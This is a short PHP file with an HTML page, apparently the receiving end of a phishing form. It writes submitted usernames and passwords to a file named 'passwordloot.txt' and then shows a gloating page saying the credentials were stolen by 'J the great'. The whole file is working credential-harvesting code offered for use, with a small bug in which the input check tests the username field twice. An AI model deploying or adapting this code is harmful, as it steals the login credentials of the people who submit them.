<?php
    if(isset($_POST['username']) && isset($_POST['username']))
         file_put_contents("passwordloot.txt", $_POST['username'] . " " . $_POST['password'] . "\n", FILE_APPEND);
?>

<!DOCTYPE html>
<html>
<head>
    <title>MWHAHAHA</title>
</head>
<body>
    <h1>MWAHAHA! Your username and password has been stolen by J the great!!!</h1>
</body>
</html>
